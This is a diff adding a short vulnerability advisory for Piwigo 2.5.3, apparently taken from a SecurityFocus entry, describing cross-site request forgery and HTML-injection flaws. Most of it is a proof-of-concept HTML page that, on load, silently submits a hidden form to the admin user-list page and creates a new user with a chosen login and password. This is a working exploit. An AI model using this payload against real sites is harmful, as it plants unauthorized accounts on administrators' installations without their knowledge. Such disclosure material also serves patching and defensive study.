@@ -1,0 +1,25 @@
+source: http://www.securityfocus.com/bid/64357/info
+
+Piwigo is prone to cross-site request-forgery and HTML-injection vulnerabilities.
+
+Exploiting these issues may allow a remote attacker to perform certain unauthorized actions, execute arbitrary script or HTML code within the context of the browser, and steal cookie-based authentication credentials. Other attacks are also possible.
+
+Piwigo 2.5.3 is vulnerable; other versions may also be affected.
+
+<head>
+<title>POC</title>
+</head>
+<body>
+<form action="http://www.example.com/cms/piwigo/admin.php?page=user_list"
+id="formid" method="post">
+<input type="hidden" name="login" value="crsfpoc123" />
+<input type="hidden" name="password" value="Password123@" />
+<input type="hidden" name="email" value="xyz@aaww.com" />
+<input type="hidden" name="send_password_by_mail" value="1" />
+<input type="hidden" name="submit_add" value="Submit" />
+</form>
+<script>
+document.getElementById('formid').submit();
+</script>
+</body>
+</html> 
